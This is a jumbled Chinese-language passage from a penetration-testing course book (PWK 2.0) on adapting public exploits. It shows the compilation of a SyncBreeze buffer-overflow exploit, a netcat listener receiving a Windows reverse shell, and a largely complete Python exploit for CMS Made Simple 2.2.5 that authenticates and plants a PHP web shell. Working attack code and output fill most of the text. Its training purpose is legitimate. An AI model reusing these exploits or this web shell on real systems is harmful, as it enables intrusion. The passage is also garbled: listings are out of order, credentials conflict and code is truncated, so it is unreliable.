
kali@Desktop$ `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`

kali@Desktop$ `ls -lah`

total 372K

drwxr-xr-x drwx-xr-x -rwxr-xr-- -rwxr-xr-

kali 4.0K 17 kali 4.0K 1 4.7K 1 355K

Feb 24 17:14 ..

Feb 24 15:42 ..

Feb 24 15:46 42341.c

Feb 24 17:14 syncbreeze_exploit.exe

Linux机器。为了运行这个二进制文件，我们将使用 `wine`，这是一个可以在 Linux、BSD 和 MacOS 等多个操作系统上运行 Windows 应用程序的层。

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 4537 代码包含了以下函数、返回地址注入和载荷更改

让我们使用 `mingw64` 编译漏洞代码，看看是否生成了任何错误：

列表 438 - 使用 `mingw64` 编译修改后的代码

现在我们有了更新且干净的漏洞，可以对其进行测试。我们将调试器附加到沙盒测试目标上的 SyncBreeze，并在 `JMP` 指令的内存地址处设置断点：

```c
char *buffer = malloc(buffer_length);
memset(buffer, 0x00, buffer_length);
strncpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);
strcat(buffer, retn);
strcat(buffer, shellcode);
strcat(buffer, request_three);
```

# 388 通过各种字符串处理函数通过 `strcpy` 的变量

386 (cplusplus, 2019); http://www.cplusplus.com/reference/csdtlib/malloc/
387 (cplusplus, 2019); http://www.cplusplus.com/reference/cstring/memset/
388 (cplusplus, 2019); http://www.cplusplus.com/reference/cstring/strcpy/
389 (cplusplus, 2019); http://www.cplusplus.com/reference/cstring/strcat/

以及 `strcat`。

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved.

467

将最终缓冲区构建为字符串是一个非常重要的信息。C 编程语言使用空终止字符串，`strcpy` 定义通过搜索目标字符数组中第一个 NULL 字节的出现的位置来定义字符串的末尾和大小。由于我们的初始填充缓冲区的分配大小为 780，通过将最后一个字节设置为 `0x00`（列表 442），我们还拼接 (`strcat`) 了一段长度为 779 字节的“A” ASCII 字符字符串。这确保了 `EIP` 寄存器的未对齐覆盖。

Kali Linux 2.0 渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_530_0.png)

意味着诸如函数：

```c
int initial_buffer_size = 781;
```

```c
char *padding = malloc(initial_buffer_size);
memset(padding, 0x41, initial_buffer_size);
memset(padding + initial_buffer_size - 1, 0x00, 1);
```

```bash
kali@~/Desktop$ i686-w64-mingw32-gcc 42341.c -o synbreeze_exploit.exe -lws2_32
```

```bash
kali@~$ sudo nc -lvp 443
listening on [any] 443 ...
```

```bash
kali@~/Desktop$ wine synbreeze_exploit.exe
```

- [>] Winsock... [>] 已初始化。
- [>] Socket 已创建
- [>] 已连接
- [>] 请求已发送

```
[any] 443 ...connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 49662
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.
```

```cmd
C:\Windows\system32>
```

代码执行，且 Exploit-DB 上提供了公开的利用程序。

391 (Offensive Security, 2015), https://www.exploit-db.com/exploits/38457/
392 (Offensive Security, 2018), https://www.exploit-db.com/44976

Kali Linux 2.0 渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_530_1.png)

# 15.1.7.1 练习

- 1. 修复溢出缓冲区，使 `EIP` 寄存器被选择的返回地址覆盖。
- 2. 安装位于 `C:\Tools\fixing_exploits` 目录下的 ASX to MP3 Converter 应用程序；从 EDB⁹ 下载 ASX to MP3 Converter 的利用程序并进行编辑，以便在你的专用 Windows 机器上获得 shell。

# 15.2 修复 Web 漏洞

Web 漏洞通常不会导致内存损坏。这意味着它们不受操作系统提供的保护（如 `DEP` 和 `ASLR`）的影响，并且明显更容易被重用。

# 15.2.1 考虑因素

尽管我们可能需要处理十六进制编码的负载，正确阅读代码以理解这一点是重要的。在修改利用程序时，有几个关键问题需要考虑：

- 它连接的是 `HTTP` 还是 `HTTPS`？
- 它访问的是哪个应用程序路径？
- 利用程序是如何进行身份验证的？
- `POST` 请求是如何构造的以触发漏洞的？
- 默认设置是否会影响利用程序？
- 自签名证书是否会破坏利用程序？

此外，我们必须记住利用程序可能并不这些保护措施，因为它们在利用程序的考虑范围之外。

# 15.2.2 选择漏洞

让我们考虑以下场景。在评估期间，我们发现了一个暴露的 Linux 主机。在枚举 Web 服务器后，我们发现了运行在 443 端口的 Simple CMS 2.2 安装。该版本似乎受到远程攻击。

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 469

Kali Linux 2.0 渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_531_0.png)

该漏洞是身份验证后的，然而我们在渗透过程中发现了有效的应用程序凭据（`admin` / `HUYf63`）。

# 15.2.3 修改连接信息

当我们检查代码时，意识到 `base_url` 变量需要修改以匹配我们的环境：

`base_url = "http://192.168.1.10/cms/admin"`

列表 448 - 原始利用程序定义的 `base_url`
我们必须修改 IP 地址和协议为

`base_url = "https://10.11.0.128/admin"`

我们注意到在浏览网站时出现了 `SEC_ERROR_ISSUER`。这意味着远程主机的证书无法验证。我们需要在利用程序中考虑到这一点。

具体来说，利用程序使用 `requests` 库与目标进行通信。代码在第 35、54 和 80 行有三个 `post` 请求：

列表 450 - 原始利用程序定义的三个 `post` 请求
官方文档指出，如果设置 `verify` 参数，则 SSL 证书将被忽略：

列表 451 - 忽略 SSL 验证的修改后的请求

最后，我们需要更改 `username` 和 `password` 变量中的凭据，以匹配在渗透过程中发现的内容。它们定义在第 15 和 16 行：

```python
username = "admin"
password = "password"
```

# Kali Linux 2.0 渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_533_0.png)

列表 452 - 原始利用程序定义的 `username` 和 `password` 变量
我们可以轻松替换这些凭据：

列表 453 - 更新以匹配我们的 `username` 和 `password` 变量

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_533_1.png)

注意，在这种情况下，我们不需要更新简单负载，因为它只执行 `GET` 请求中明文传递的系统命令。

在完成所有编辑后，最终的利用程序如下所示：

`username = "admin"`
`password = "HUYfaw763"`

# 漏洞标题: CMS Made Simple 2.2.5 身份验证远程代码执行
# 日期: 2018年7月3日
# 漏洞作者: Mustafa Hasan (@strukt93)
# 厂商主页: http://www.cmnsadesimple.org/
# 软件链接: http://www.cmnsadesimple.org/downloads/cmsms/
# 版本: 2.2.5
# CVE: CVE-2018-1000094

```python
import requests
import base64

base_url = "https://10.11.0.128/admin"
upload_dir = "/uploads"
upload_url = base_url.split('/admin')[0] + upload_dir
username = "admin"
password = "HUYfaw763"
csrf_param = "_c"
txt_filename = "cmmsnrc.txt"
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]

def authenticate():
    page = "/login.php"
    url = base_url + page
    data = {
        "username": username,
        "password": password,
        "loginsubmit": "Submit"
    }
    response = requests.post(url, data=data, allow_redirects=False, verify=False)
    if response.status_code == 302:
        print("[+] 使用提供的凭据身份验证成功")
        return response.cookies, parse_csrf_token(response.headers['Location'])
    else:
        print("[-] 身份验证失败")
        return None, None

def upload_txt(cookies, csrf_token):
    mact = "FileManager,m1_upload,0"
    page = "/moduleinterface.php"
    url = base_url + page
    data = {
      "mact": mact,
      csrf_param: csrf_token,
      "disable_buffer": 1
    }
    txt = {
      "m1_files[]": (txt_filename, payload)
    }
    print("[+] 正在上传 {}".format(txt_filename))
    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
    if response.status_code == 200:
        print("[+] 成功上传 {}".format(txt_filename))
        return True
    print("[-] 上传 {} 时发生".format(txt_filename))
    return None

def copy_to_php(cookies, csrf_token):
    mact = "FileManager,m1_upload,0"
    page = "/moduleinterface.php"
    url = base_url + page
    b64 = base64.b64encode(txt_filename)
    serialized = "a={0};j={1};format(b64)".format(len(b64), b64)
    data = {
      "mact": mact,
      csrf_param: csrf_token,
      "m1_path": upload_dir,
      "m1_selall": serialized,
      "m1_destdir": "/",
      "m1_destname": php_filename,
      "m1_submit": "Copy"
    }
    print("[+] 正在拷贝 {} 到 {}".format(txt_filename, php_filename))
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
    if response.status_code == 302:
        if response.headers['Location'].endswith("copysuccess"):
            print("[+] 文件拷贝成功")
            return True
    print("[-] 拷贝时发生错误，{} 已经存在".format(php_filename))
    return None

def quit():
    print("- 漏洞利用失败")
    exit()

def run():
    cookies, csrf_token = authenticate()
    if not cookies:
        quit()
    # ... (流程隐含的剩余逻辑)
```

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 472

列表 454 - 包含我们用例所需更改的修改后的漏洞

# 运行漏洞产生了意想不到的错误：

使用 Kali Linux 进行渗透测试 2.0

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_536_0.png)

```python
quit()
if not upload_txt(cookies, csrf_token):
    quit()
```
